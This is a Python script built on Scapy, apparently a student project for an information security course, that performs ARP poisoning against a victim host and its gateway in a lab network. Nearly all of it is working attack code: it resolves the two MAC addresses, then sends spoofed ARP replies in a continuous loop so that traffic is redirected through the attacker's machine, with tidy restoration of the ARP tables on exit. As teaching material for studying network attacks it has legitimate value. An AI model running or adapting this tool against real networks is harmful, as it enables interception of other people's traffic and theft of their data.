                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
#==!/usr/bin/env python3
import sys
import time
import os
from scapy.all import *

# --- CONFIGURACIÓN DE RED ---
# Ajusta estas IPs según tu topología en GNS3/VMware
ip_victima = "10.20.12.50"   # La máquina que quieres interceptar
ip_gateway = "10.20.12.1"   # El Router que vas a suplantar
interfaz   = "eth0"         # Tu tarjeta de red en Kali

# --- SISTEMA DE COLORES ---
R = '\033[91m'  # Rojo
G = '\033[92m'  # Verde
Y = '\033[93m'  # Amarillo
C = '\033[96m'  # Cyan
W = '\033[0m'   # Blanco/Reset
B = '\033[1m'   # Negrita

def limpiar():
    os.system('clear')

def get_mac(ip):
    # Envía una petición ARP para averiguar la MAC de una IP
    paquete = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip)
    ans, _ = srp(paquete, timeout=2, verbose=0, iface=interfaz)
    if ans:
        return ans[0][1].hwsrc
    return None

def barra_progreso(texto):
    sys.stdout.write(f"{C}[*] {texto} {W}")
    for i in range(10):
        time.sleep(0.1)
        sys.stdout.write(f"{G}■")
        sys.stdout.flush()
    print(f"{W}")

# --- INICIO DEL PROGRAMA ---
limpiar()

# 1. Obtener IP propia (Atacante)
try:
    ip_atacante = get_if_addr(interfaz)
except:
    ip_atacante = "NO DETECTADA"

# 2. Banner Principal
print(f"{R}╔{'═'*58}╗")
print(f"║ {B}{Y}   ARP POISONING TOOL - INFORMATION SECURITY PROJECT    {R}  ║")
print(f"╠{'═'*58}╣")
print(f"║ {C}ESTUDIANTE :{W} Masucc Franco                             {R}║")
print(f"║ {C}MATRÍCULA  :{W} 2024-1250                                 {R}║")
print(f"║ {C}ASIGNATURA :{W} Seguridad Informatica               {R}║")
print(f"╚{'═'*58}╝{W}\n")

# 3. Escaneo de Objetivos
barra_progreso(f"Escaneando Víctima ({ip_victima})")
mac_victima = get_mac(ip_victima)

if not mac_victima:
    print(f"\n{R}[ERROR] No se encuentra a la víctima. Verifica la IP o GNS3.{W}")
    sys.exit(1)

barra_progreso(f"Escaneando Gateway ({ip_gateway})")
mac_gateway = get_mac(ip_gateway)

if not mac_gateway:
    print(f"\n{R}[ERROR] No se encuentra el Gateway. Verifica la IP.{W}")
    sys.exit(1)

# 4. Panel de Ataque (Dashboard)
limpiar()
print(f"{R}╔{'═'*58}╗")
print(f"║ {B}{R}              ⚠  ATAQUE EN PROCESO  ⚠                 {R}║")
print(f"╠{'═'*58}╣")
print(f"║ {Y}ATACANTE (Tú):   {W}{ip_atacante:<35} {R}║")
print(f"║ {Y}VÍCTIMA (Target):{W} {ip_victima:<15} [{mac_victima}]   {R}║")
print(f"║ {Y}SUPLANTANDO A:   {W} {ip_gateway:<15} [{mac_gateway}]   {R}║")
print(f"╚{'═'*58}╝{W}")
print(f"\n{G}[+] Redireccionando tráfico... (Presiona Ctrl + C para detener){W}")

# 5. Bucle de Envenenamiento (Spoofing)
try:
    paquetes_enviados = 0
    while True:
        # Paquete 1: Decirle a la Víctima que YO soy el Router
        # op=2 (Reply), pdst=Victima, hwdst=MAC_Victima, psrc=Router(Spoof)
        arp_response_v = ARP(op=2, pdst=ip_victima, hwdst=mac_victima, psrc=ip_gateway)
        
        # Paquete 2: Decirle al Router que YO soy la Víctima
        # op=2 (Reply), pdst=Router, hwdst=MAC_Router, psrc=Victima(Spoof)
        arp_response_g = ARP(op=2, pdst=ip_gateway, hwdst=mac_gateway, psrc=ip_victima)

        send(arp_response_v, verbose=0, iface=interfaz)
        send(arp_response_g, verbose=0, iface=interfaz)
        
        paquetes_enviados += 2
        
        # Animación de estado
        sys.stdout.write(f"\r{Y}⚡ Paquetes inyectados: {paquetes_enviados} | Manteniendo conexión...{W}")
        sys.stdout.flush()
        time.sleep(2)

except KeyboardInterrupt:
    print(f"\n\n{R}╔{'═'*58}╗")
    print(f"║ {B}{W}            DETENIENDO Y RESTAURANDO RED...             {R}║")
    print(f"╚{'═'*58}╝{W}")
    
    # Restaurar tablas ARP (Curar la red)
    # Enviamos la MAC real del gateway a la víctima y viceversa
    print(f"{C}[*] Restaurando tabla ARP de la Víctima...{W}")
    send(ARP(op=2, pdst=ip_victima, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_gateway, hwsrc=mac_gateway), count=5, verbose=0)
    
    print(f"{C}[*] Restaurando tabla ARP del Gateway...{W}")
    send(ARP(op=2, pdst=ip_gateway, hwdst="ff:ff:ff:ff:ff:ff", psrc=ip_victima, hwsrc=mac_victima), count=5, verbose=0)
    
    print(f"\n{G}✔ Ataque finalizado correctamente. Conectividad restaurada.{W}")
_

